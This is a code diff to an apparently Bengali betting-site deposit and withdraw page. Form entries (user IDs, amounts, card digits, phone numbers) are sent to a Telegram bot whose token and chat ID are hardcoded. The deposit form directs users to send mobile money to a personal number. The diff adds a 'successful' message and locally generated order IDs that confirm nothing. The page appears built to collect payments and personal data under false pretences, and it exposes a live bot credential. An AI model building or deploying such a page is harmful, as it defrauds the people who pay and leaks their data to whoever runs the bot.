@@ -31,7 +31,6 @@ body{
   padding-bottom:120px;
 }
 
-/* TOP NOTE */
 .top-note{
   overflow:hidden;
   background: rgba(14,165,233,0.15);
@@ -50,7 +49,6 @@ body{
   100%{transform:translateX(-100%);}
 }
 
-/* TABS */
 .tabs{
   display:flex;
   margin-bottom:8px;
@@ -71,7 +69,6 @@ body{
   color:white;
 }
 
-/* CARD */
 .card{
   background:rgba(2,6,23,0.9);
   padding:18px;
@@ -79,7 +76,6 @@ body{
   margin-top:6px;
 }
 
-/* METHODS */
 .methods{
   display:flex;
   gap:8px;
@@ -104,9 +100,13 @@ body{
   background:#020617;
   border:1px dashed #0ea5e9;
   text-align:center;
+  font-size:18px;
 }
 
-/* INPUT */
+.number-card b{
+  font-size:22px;
+}
+
 .row{
   display:flex;
   gap:8px;
@@ -132,7 +132,6 @@ body{
   font-weight:600;
 }
 
-/* FLOAT AREA */
 .float-area{
   position:fixed;
   bottom:110px;
@@ -142,11 +141,8 @@ body{
   max-width:380px;
   display:flex;
   justify-content:space-between;
-  align-items:flex-end;
-  z-index:999;
 }
 
-/* SAME AS TOP ANIMATION */
 .left-btn{
   overflow:hidden;
   background: rgba(14,165,233,0.15);
@@ -160,7 +156,6 @@ body{
   animation:slide 10s linear infinite;
 }
 
-/* WHATSAPP */
 .whatsapp{
   width:60px;
   height:60px;
@@ -171,11 +166,21 @@ body{
   align-items:center;
 }
 
-/* LOADER */
 .loader{
   display:none;
   text-align:center;
   margin-top:10px;
+}
+
+/* SUCCESS BOX */
+.success-box{
+  display:none;
+  margin-top:12px;
+  padding:12px;
+  border-radius:14px;
+  background:rgba(14,165,233,0.15);
+  border:1px solid #0ea5e9;
+  text-align:center;
 }
 </style>
 </head>
@@ -196,10 +201,10 @@ body{
 <!-- Deposit -->
 <div id="deposit" class="card">
 
-  <div class="methods">
-    <div class="method active" onclick="selectMethod(this)">বিকাশ</div>
-    <div class="method" onclick="selectMethod(this)">নগদ</div>
-    <div class="method" onclick="selectMethod(this)">রকেট</div>
+  <div class="methods" id="depositMethods">
+    <div class="method active" onclick="selectMethod(this,'deposit')">বিকাশ</div>
+    <div class="method" onclick="selectMethod(this,'deposit')">নগদ</div>
+    <div class="method" onclick="selectMethod(this,'deposit')">রকেট</div>
   </div>
 
   <div class="number-card" id="numberCard"></div>
@@ -212,15 +217,16 @@ body{
 
   <button class="btn" onclick="sendDeposit()">সাবমিট</button>
   <div class="loader" id="loader">⏳ Processing...</div>
+  <div class="success-box" id="success1"></div>
 </div>
 
 <!-- Withdraw -->
 <div id="withdraw" class="card" style="display:none;">
 
-  <div class="methods">
-    <div class="method active">বিকাশ</div>
-    <div class="method">নগদ</div>
-    <div class="method">রকেট</div>
+  <div class="methods" id="withdrawMethods">
+    <div class="method active" onclick="selectMethod(this,'withdraw')">বিকাশ</div>
+    <div class="method" onclick="selectMethod(this,'withdraw')">নগদ</div>
+    <div class="method" onclick="selectMethod(this,'withdraw')">রকেট</div>
   </div>
 
   <div class="row">
@@ -231,11 +237,11 @@ body{
 
   <button class="btn" onclick="sendWithdraw()">সাবমিট</button>
   <div class="loader" id="loader2">⏳ Processing...</div>
+  <div class="success-box" id="success2"></div>
 </div>
 
 </div>
 
-<!-- FLOAT -->
 <div class="float-area">
   <div class="left-btn">
     <span>বাজিওয়াল 9xbet ভেল্কি সকল সাইডের লিংক সমূহ •</span>
@@ -253,78 +259,80 @@ const botToken = "8216213984:AAFCOQsGouXgnit2vKR6Rv8-VonSYL7_irk";
 const chatId = "8406979793";
 
 let orderCounter = 23;
+let selectedDeposit = "বিকাশ";
+let selectedWithdraw = "বিকাশ";
 
 function generateOrderId(){
   return "#" + (orderCounter++);
 }
 
 function sendDeposit(){
-  document.getElementById("loader").style.display="block";
+  loader.style.display="block";
 
   setTimeout(()=>{
-    let orderId = generateOrderId();
+    let id = generateOrderId();
 
-    let msg = `📥 Deposit Request
-🆔 Order ID: ${orderId}
-🆔 User ID: ${d_userid.value}
-💰 Amount: ${d_amount.value}
-🔢 Last 4 Digit: ${d_last.value}
-📅 ${new Date().toLocaleString()}`;
+    let msg = `📥 Deposit
+🆔 ${id}
+Method: ${selectedDeposit}
+User: ${d_userid.value}
+Amount: ${d_amount.value}
+Last: ${d_last.value}`;
 
     sendToTelegram(msg);
-    alert("Order ID: " + orderId);
 
-    document.getElementById("loader").style.display="none";
+    success1.innerHTML = `✅ সফল হয়েছে<br>Order ID: ${id}`;
+    success1.style.display="block";
+    loader.style.display="none";
   },1500);
 }
 
 function sendWithdraw(){
-  document.getElementById("loader2").style.display="block";
+  loader2.style.display="block";
 
   setTimeout(()=>{
-    let orderId = generateOrderId();
+    let id = generateOrderId();
 
-    let msg = `📤 Withdraw Request
-🆔 Order ID: ${orderId}
-🆔 User ID: ${w_userid.value}
-💰 Amount: ${w_amount.value}
-📱 Number: ${w_number.value}
-📅 ${new Date().toLocaleString()}`;
+    let msg = `📤 Withdraw
+🆔 ${id}
+Method: ${selectedWithdraw}
+User: ${w_userid.value}
+Amount: ${w_amount.value}
+Number: ${w_number.value}`;
 
     sendToTelegram(msg);
-    alert("Order ID: " + orderId);
 
-    document.getElementById("loader2").style.display="none";
+    success2.innerHTML = `✅ সফল হয়েছে<br>Order ID: ${id}`;
+    success2.style.display="block";
+    loader2.style.display="none";
   },1500);
 }
 
 function sendToTelegram(message){
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id:chatId,
-      text:message
-    })
-  })
-  .then(res=>res.json())
-  .then(data=>console.log(data))
-  .catch(err=>console.log(err));
+    body:JSON.stringify({chat_id:chatId,text:message})
+  });
 }
 
-function selectMethod(el){
-  document.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
+function selectMethod(el,type){
+  let parent = type==='deposit'?depositMethods:withdrawMethods;
+  parent.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
   el.classList.add('active');
 
-  document.getElementById('numberCard').innerHTML =
-    el.innerText + " নাম্বার<br><b>01316616956</b>";
-
-  document.getElementById('numberCard').style.display='block';
+  if(type==='deposit'){
+    selectedDeposit = el.innerText;
+    numberCard.innerHTML = `<b>01316616956</b><br>ক্যাশ আউট করুন`;
+    numberCard.style.display="block";
+  }else{
+    selectedWithdraw = el.innerText;
+  }
 }
 
 function showTab(tab,e){
-  document.getElementById('deposit').style.display='none';
-  document.getElementById('withdraw').style.display='none';
+  deposit.style.display='none';
+  withdraw.style.display='none';
   document.getElementById(tab).style.display='block';
 
   document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
